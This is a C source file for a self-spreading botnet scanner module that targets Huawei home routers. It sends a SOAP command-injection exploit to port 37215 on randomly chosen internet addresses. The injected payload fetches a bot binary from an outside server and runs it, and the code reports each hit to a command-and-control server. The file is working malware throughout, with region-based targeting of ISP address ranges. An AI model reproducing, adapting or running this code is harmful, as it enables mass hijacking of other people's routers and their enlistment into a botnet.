#include "includes.h"
#include "huawei.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

/* Reduced scanner settings to prevent crashes */
#define HUAWEI_SCANNER_MAX_CONNS 32     /* Reduced from 128 */
#define HUAWEI_SCANNER_RAW_PPS 24       /* Reduced from 160 */
#define HUAWEI_SCANNER_PORT 37215
#define HUAWEI_CONNECTION_DELAY 300     /* Milliseconds between connections */

/* Huawei SOAP exploit payload */
static char *huawei_payload =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
"<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n"
"<s:Body>\r\n"
"<u:Upgrade xmlns:u=\"urn:dslforum-org:service:DeviceConfig:1\">\r\n"
"<NewStatusURL>http://$(wget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/m;sh /tmp/m)</NewStatusURL>\r\n"
"<NewDownloadURL>$(wget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/m;sh /tmp/m)</NewDownloadURL>\r\n"
"</u:Upgrade>\r\n"
"</s:Body>\r\n"
"</s:Envelope>\r\n";

struct huawei_conn {
    int fd;
    ipv4_t dst_addr;
    uint8_t state;
    time_t last_recv;
};

static struct huawei_conn conns[HUAWEI_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_huawei(void);
static void huawei_connect(struct huawei_conn *);
static void huawei_close(struct huawei_conn *);

void huawei_scanner_init(void) {
    if (fork() == 0) {
        int i;
        time_t last_connect = 0;

        for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = 0;
        }

        srand(time(NULL));

        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            time_t now = time(NULL);

            FD_ZERO(&fdset);

            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }

            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            /* Check timeouts */
            time_t now = time(NULL);
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    huawei_close(&conns[i]);
                }
            }
            
            /* Process readable sockets */
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[1024];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        huawei_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        /* Check for successful exploit */
                        if (util_stristr(buf, n, "OK") || util_stristr(buf, n, "Success")) {
                            /* Report to C&C */
                            uint8_t report[8];
                            uint32_t addr = conns[i].dst_addr;
                            report[0] = (addr >> 24) & 0xFF;
                            report[1] = (addr >> 16) & 0xFF;
                            report[2] = (addr >> 8) & 0xFF;
                            report[3] = addr & 0xFF;
                            report[4] = 0;
                            report[5] = 0;
                            report[6] = 8; // username len
                            memcpy(report + 7, "huawei", 6);
                            report[7] = 0; // password len
                            
                            int fd = socket(AF_INET, SOCK_STREAM, 0);
                            struct sockaddr_in cnc;
                            cnc.sin_family = AF_INET;
                            cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
                            cnc.sin_port = htons(HUAWEI_SCANNER_PORT);
                            if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
                                send(fd, report, 8, 0);
                            }
                            close(fd);
                        }
                        huawei_close(&conns[i]);
                    }
                }
            }
            
            /* Start new connections */
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_huawei();
                    huawei_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_huawei(void) {
    ipv4_t addr;

    while (TRUE) {
        addr = rand_next();

        /* Target Huawei ISP deployments - Global coverage
         * Major ISPs: MTN, Etisalat, STC, Airtel, Viettel, Claro, Movistar
         * Regions: Africa, Middle East, Asia, Latin America, Europe
         */
        uint8_t first_octet = (addr >> 24) & 0xFF;

        /* Africa - Major Huawei deployment */
        if (first_octet == 197 || first_octet == 196 || first_octet == 195 ||
            first_octet == 194 || first_octet == 193 || first_octet == 192 ||
            first_octet == 165 || first_octet == 164 || first_octet == 163 ||
            first_octet == 162 || first_octet == 161 || first_octet == 160 ||
            first_octet == 159 || first_octet == 158 || first_octet == 157 ||
            first_octet == 156 || first_octet == 155 || first_octet == 154 ||
            first_octet == 153 || first_octet == 41) {
            break;
        }

        /* Middle East - Huawei strong presence */
        if (first_octet == 95 || first_octet == 94 || first_octet == 93 ||
            first_octet == 92 || first_octet == 91 || first_octet == 90 ||
            first_octet == 89 || first_octet == 88 || first_octet == 87 ||
            first_octet == 86 || first_octet == 85 || first_octet == 84 ||
            first_octet == 83 || first_octet == 82 || first_octet == 81 ||
            first_octet == 80 || first_octet == 46 || first_octet == 47 ||
            first_octet == 48 || first_octet == 49) {
            break;
        }

        /* Asia - Huawei deployments */
        if (first_octet == 125 || first_octet == 124 || first_octet == 123 ||
            first_octet == 122 || first_octet == 121 || first_octet == 120 ||
            first_octet == 119 || first_octet == 118 || first_octet == 117 ||
            first_octet == 116 || first_octet == 115 || first_octet == 114 ||
            first_octet == 113 || first_octet == 112 || first_octet == 111 ||
            first_octet == 110 || first_octet == 109 || first_octet == 108 ||
            first_octet == 107 || first_octet == 106 || first_octet == 105 ||
            first_octet == 104 || first_octet == 103 || first_octet == 102 ||
            first_octet == 101 || first_octet == 63 || first_octet == 62 ||
            first_octet == 61 || first_octet == 60 || first_octet == 59 ||
            first_octet == 58 || first_octet == 57 || first_octet == 56 ||
            first_octet == 55 || first_octet == 54 || first_octet == 53 ||
            first_octet == 52 || first_octet == 51 || first_octet == 50 ||
            first_octet == 45 || first_octet == 44 || first_octet == 43 ||
            first_octet == 42 || first_octet == 40 || first_octet == 39 ||
            first_octet == 38 || first_octet == 37 || first_octet == 36 ||
            first_octet == 27 || first_octet == 14 || first_octet == 2 ||
            first_octet == 1) {
            break;
        }

        /* Latin America - Huawei growing presence */
        if (first_octet == 201 || first_octet == 200 || first_octet == 191 ||
            first_octet == 190 || first_octet == 189 || first_octet == 187 ||
            first_octet == 186 || first_octet == 181 || first_octet == 180 ||
            first_octet == 179 || first_octet == 177) {
            break;
        }

        /* Europe - Huawei presence */
        if (first_octet == 79 || first_octet == 78 || first_octet == 77 ||
            first_octet == 76 || first_octet == 75 || first_octet == 74 ||
            first_octet == 73 || first_octet == 72 || first_octet == 71 ||
            first_octet == 70 || first_octet == 69 || first_octet == 68 ||
            first_octet == 67 || first_octet == 66 || first_octet == 65) {
            break;
        }

        /* Asia-Pacific (Australia, Pacific) */
        if (first_octet == 203 || first_octet == 202 || first_octet == 210 ||
            first_octet == 211 || first_octet == 218 || first_octet == 219 ||
            first_octet == 220) {
            break;
        }
    }

    return addr;
}

static void huawei_connect(struct huawei_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(HUAWEI_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        /* Send exploit payload */
        send(conn->fd, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n", 39, 0);
        send(conn->fd, "Host: ", 6, 0);
        
        char ip_str[32];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d\r\n",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        send(conn->fd, ip_str, util_strlen(ip_str), 0);
        
        send(conn->fd, "Content-Type: text/xml\r\n", 24, 0);
        send(conn->fd, "SOAPAction: urn:dslforum-org:service:DeviceConfig:1#Upgrade\r\n", 62, 0);
        send(conn->fd, "Connection: close\r\n", 19, 0);
        
        char len_str[16];
        snprintf(len_str, sizeof(len_str), "Content-Length: %d\r\n\r\n", util_strlen(huawei_payload));
        send(conn->fd, len_str, util_strlen(len_str), 0);
        send(conn->fd, huawei_payload, util_strlen(huawei_payload), 0);
        
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void huawei_close(struct huawei_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
